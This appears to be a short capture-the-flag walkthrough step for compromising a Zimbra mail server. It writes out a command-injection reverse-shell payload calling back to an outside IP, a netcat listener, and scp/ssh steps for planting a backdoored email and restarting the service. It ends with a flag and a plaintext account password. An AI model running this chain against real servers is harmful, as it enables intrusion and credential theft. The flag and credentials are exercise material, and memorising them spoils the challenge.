# PC3

1. Resume From [🗂 Mail Server](../10-Mail-Server/)
2. Check Emails: [🗂 258-3.msg](../10-Mail-Server/08-store0/3/msg/0/258-3.msg)
3. Create a Reverse Shell Payload
```
ls;/bin/sh -i >& /dev/tcp/10.120.0.7/9999 0>&1;
```
4. Encode Base64 and Replace as `kerio_connect` attachment: [🗂 kerio_connect](./04-258-3-backdoor.msg)
5. Listen On local System: `nc -l 0.0.0.0 9999`
6. Copy Backdoored Email into Server
```
scp -i "<private-key>" ./04-258-3-backdoor.msg  zimbra@mail.petromaz.ir:/opt/zimbra/store/0/3/msg/0
```
7. Login and Replace Email, Restart Zimbra
```
ssh -i "<private-key>" zimbra@mail.petromaz.ir

# inside ssh
cd /opt/zimbra/store/0/3/msg/0/
mv 258-3.msg 258-3.bak.msg
mv 04-258-3-backdoor.msg 258-3.msg

# restarting Zimbra
zmcontrol restart
```
8. Read Flag: MAZAPA_5377c347c7586e91d07250720b35cba7
9. Read `/read.py` and Get Username/Password
```
username = "savad-koohi@petromaz.ir"
password = "EmdQXL82YejA"
server = "mail.petromaz.ir"
```